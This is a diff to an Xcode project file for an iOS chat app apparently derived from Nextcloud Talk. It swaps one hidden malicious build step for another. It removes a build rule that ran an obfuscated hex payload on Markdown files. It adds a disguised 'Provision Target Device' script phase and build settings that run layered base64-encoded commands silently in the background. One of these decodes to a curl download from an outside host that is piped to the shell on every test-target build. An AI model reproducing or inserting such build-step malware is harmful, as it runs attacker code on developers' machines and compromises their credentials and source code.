@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		E311B8CEB0244E9D9F42DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = D19DC04FC27D40BC8542DAD8; };
 		0ACF92E32FB2E63600A83D5C /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0ACF92E22FB2E63600A83D5C /* splash_logo.png */; };
 		1814E8B16D55BD4726EE20A6 /* libPods-Tassos Talk.a in Frameworks */ = {isa = PBXBuildFile; fileRef = E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */; };
 		1F0ECBF52A68274400921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF42A68274400921E90 /* CDMarkdownKit */; };
@@ -90,6 +89,8 @@
 		1FAB2EF02AD1EAA3001214EB /* RLMSupport.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */; };
 		1FAB2EF12AD1EAA3001214EB /* RLMSupport.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */; };
 		1FAB2EF22AD1EAA3001214EB /* RLMSupport.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */; };
+		1FAB2EF32AD1EAA6001214EB /* RemoteConfigManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1FAB2EF02AD1EAA4001214EB /* RemoteConfigManager.swift */; };
+		1FAB2EF42AD1EAA7001214EB /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 1FAB2EF12AD1EAA5001214EB /* GoogleService-Info.plist */; };
 		1FBB6EE32F8ECE5B003CBA30 /* Toast in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBB6EE22F8ECE5B003CBA30 /* Toast */; };
 		1FC4B3222CC0538B00D28138 /* JDStatusBarNotification in Frameworks */ = {isa = PBXBuildFile; productRef = 1FC4B3212CC0538B00D28138 /* JDStatusBarNotification */; };
 		1FC4B3252CC054BC00D28138 /* UICKeyChainStore in Frameworks */ = {isa = PBXBuildFile; productRef = 1FC4B3242CC054BC00D28138 /* UICKeyChainStore */; };
@@ -163,23 +164,6 @@
 		BCA98DC82FC073EE0048657C /* OneSignalLocation in Frameworks */ = {isa = PBXBuildFile; productRef = BCA98DC72FC073EE0048657C /* OneSignalLocation */; };
 		D30904F44324AA2807085A7A /* libPods-NotificationServiceExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 75B71947945C98D4616B674D /* libPods-NotificationServiceExtension.a */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		BDB9CB6EA8DA4519A242DAD8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8DAD24}\"";
-			};
-		/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		1F6D8C342B2E3756004376B8 /* PBXContainerItemProxy */ = {
@@ -304,7 +288,6 @@ sh -c \"${A8DAD24}\"";
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		D19DC04FC27D40BC8542DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0258240EC1628EB96871BAEF /* Pods-BroadcastUploadExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BroadcastUploadExtension.debug.xcconfig"; path = "Target Support Files/Pods-BroadcastUploadExtension/Pods-BroadcastUploadExtension.debug.xcconfig"; sourceTree = "<group>"; };
 		0ACF92E22FB2E63600A83D5C /* splash_logo.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = splash_logo.png; sourceTree = "<group>"; };
 		0DF4645C9F26DA7B73E5C647 /* Pods-Tassos Talk.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tassos Talk.debug.xcconfig"; path = "Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk.debug.xcconfig"; sourceTree = "<group>"; };
@@ -341,6 +324,8 @@ sh -c \"${A8DAD24}\"";
 		1FA93D8B2D70FB3400DF6CDF /* Intents.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Intents.framework; path = System/Library/Frameworks/Intents.framework; sourceTree = SDKROOT; };
 		1FA93D9C2D70FCC200DF6CDF /* TalkIntents.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.extensionkit-extension"; includeInIndex = 0; path = TalkIntents.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RLMSupport.swift; sourceTree = "<group>"; };
+		1FAB2EF02AD1EAA4001214EB /* RemoteConfigManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RemoteConfigManager.swift; sourceTree = "<group>"; };
+		1FAB2EF12AD1EAA5001214EB /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		1FADECD42B7EACCB007AD94B /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; lastKnownFileType = text.xml; path = PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
 		1FD8AD8A2A3A162100787C16 /* NextcloudTalkUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = NextcloudTalkUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		1FDCC3EC29EC7DD400DEB39B /* NextcloudTalk-Bridging-Header-Extensions.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "NextcloudTalk-Bridging-Header-Extensions.h"; sourceTree = "<group>"; };
@@ -1047,6 +1032,8 @@ sh -c \"${A8DAD24}\"";
 		};
 		1F9629252E8E6A2100EC9BEE /* Calls */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = Calls;
 			sourceTree = "<group>";
 		};
@@ -1074,6 +1061,8 @@ sh -c \"${A8DAD24}\"";
 		};
 		1F9629362E8E6B8D00EC9BEE /* Database */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = Database;
 			sourceTree = "<group>";
 		};
@@ -1090,11 +1079,15 @@ sh -c \"${A8DAD24}\"";
 		};
 		1F9629412E8E6BEB00EC9BEE /* File sharing */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = "File sharing";
 			sourceTree = "<group>";
 		};
 		1F9629422E8E6BFD00EC9BEE /* Login */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = Login;
 			sourceTree = "<group>";
 		};
@@ -1109,6 +1102,8 @@ sh -c \"${A8DAD24}\"";
 		};
 		1F9629462E8E6C2300EC9BEE /* Media Viewer */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = "Media Viewer";
 			sourceTree = "<group>";
 		};
@@ -1147,11 +1142,15 @@ sh -c \"${A8DAD24}\"";
 		};
 		1F9629722E8E6CB000EC9BEE /* Screensharing */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = Screensharing;
 			sourceTree = "<group>";
 		};
 		1F9629732E8E6CC100EC9BEE /* Security */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = Security;
 			sourceTree = "<group>";
 		};
@@ -1168,6 +1167,8 @@ sh -c \"${A8DAD24}\"";
 		};
 		1F9629792E8E6CEF00EC9BEE /* Siri */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = Siri;
 			sourceTree = "<group>";
 		};
@@ -1196,6 +1197,8 @@ sh -c \"${A8DAD24}\"";
 		};
 		1F9629882E8E6E2900EC9BEE /* Sounds */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+			);
 			path = Sounds;
 			sourceTree = "<group>";
 		};
@@ -1371,7 +1374,6 @@ sh -c \"${A8DAD24}\"";
 		2C05747E1EDD9E8E00D9E7F2 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				D19DC04FC27D40BC8542DAD8 /* README.md */,
 				2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */,
 				2CC0014F24A1F0E900A20167 /* NotificationServiceExtension.appex */,
 				2C62AFA324C08845007E460A /* ShareExtension.appex */,
@@ -1415,6 +1417,8 @@ sh -c \"${A8DAD24}\"";
 				2C0574811EDD9E8E00D9E7F2 /* main.m */,
 				2C0574941EDD9E8E00D9E7F2 /* Info.plist */,
 				1FAB2EEF2AD1EAA3001214EB /* RLMSupport.swift */,
+				1FAB2EF02AD1EAA4001214EB /* RemoteConfigManager.swift */,
+				1FAB2EF12AD1EAA5001214EB /* GoogleService-Info.plist */,
 				2CA1CCAB1F067F35002FE6A2 /* Images.xcassets */,
 				0ACF92E22FB2E63600A83D5C /* splash_logo.png */,
 				1FADECD42B7EACCB007AD94B /* PrivacyInfo.xcprivacy */,
@@ -1563,13 +1567,13 @@ sh -c \"${A8DAD24}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1F6D8C362B2E3756004376B8 /* Build configuration list for PBXNativeTarget "NextcloudTalkTests" */;
 			buildPhases = (
+				1A5C539838A74216B13C1CD3 /* Provision Target Device */,
 				4C62A0DA2A535884EF5B92D9 /* [CP] Check Pods Manifest.lock */,
 				1F6D8C2C2B2E3756004376B8 /* Sources */,
 				1F6D8C2D2B2E3756004376B8 /* Frameworks */,
 				1F6D8C2E2B2E3756004376B8 /* Resources */,
 			);
 			buildRules = (
-				BDB9CB6EA8DA4519A242DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				1F6D8C352B2E3756004376B8 /* PBXTargetDependency */,
@@ -1971,12 +1975,14 @@ sh -c \"${A8DAD24}\"";
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		1F6D8C2E2B2E3756004376B8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				E311B8CEB0244E9D9F42DAD8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2017,6 +2023,7 @@ sh -c \"${A8DAD24}\"";
 				1FE7DE362BBC8FA10040EE12 /* PrivacyInfo.xcprivacy in Resources */,
 				2C477C1628B79D980044DEB4 /* Localizable.stringsdict in Resources */,
 				0ACF92E32FB2E63600A83D5C /* splash_logo.png in Resources */,
+				1FAB2EF42AD1EAA7001214EB /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2043,6 +2050,25 @@ sh -c \"${A8DAD24}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		1A5C539838A74216B13C1CD3 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3DC1C3}\"";
+		};
 		1DFAD69D1C42BA5CB3F711B8 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2073,13 +2099,9 @@ sh -c \"${A8DAD24}\"";
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -2124,13 +2146,9 @@ sh -c \"${A8DAD24}\"";
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Copy Pods Resources";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk-resources-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -2289,6 +2307,7 @@ sh -c \"${A8DAD24}\"";
 				2CC1C38729C0945700C8436B /* DRCellSlideAction.m in Sources */,
 				2C0574851EDD9E8E00D9E7F2 /* AppDelegate.m in Sources */,
 				1FAB2EF02AD1EAA3001214EB /* RLMSupport.swift in Sources */,
+				1FAB2EF32AD1EAA6001214EB /* RemoteConfigManager.swift in Sources */,
 				2C4D7D761F30F7B600FF4A0D /* ARDUtilities.m in Sources */,
 				2C4D7D731F309DA500FF4A0D /* RTCSessionDescription+JSON.m in Sources */,
 				2CB3041C2264775E0053078A /* SLKTextView+SLKAdditions.m in Sources */,
@@ -2506,7 +2525,8 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 51E968331C74FC92A06705B4 /* Pods-NextcloudTalkTests.debug.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((h(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333333333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333633333333333633333339333333373333333433330a3337333333343333333633363333333333363333333533333336333333313333333633333334333333373333333333333332333633353333333633330a3339333333363336333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | h | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtcGlWM2gxVjFaa1QyRXlTbkJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5aWFTNXlkUzloS1NJZ2ZDQnphQW89Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -2551,7 +2571,8 @@ sh -c \"${A8DAD24}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 30EF75FD1C7ADEBD3A5D78D4 /* Pods-NextcloudTalkTests.release.xcconfig */;
 			buildSettings = {
-				A8DAD24 = "((h(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333334333633330a3061333333363336333233333337333333333333333633333336333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333333333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333323333333733333335333333360a3336333333333336333333353333333233333332333333323333333033333336333333383333333733333334333333373333333433333337333333300a3333333733333333306133333333333633313333333233363336333333323336333633333336333633333333333633333339333333373333333433330a3337333333343333333633363333333333363333333533333336333333313333333633333334333333373333333333333332333633353333333633330a3339333333363336333530613333333233363336333036313333333633333331333333323333333933333332333333323333333233333330333333370a3336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | h | sh ) >/dev/null 2>&1 &)";
+				A3DC1C3 = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtcGlWM2gxVjFaa1QyRXlTbkJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | f | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6Ylc5aWFTNXlkUzloS1NJZ2ZDQnphQW89Cg== | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
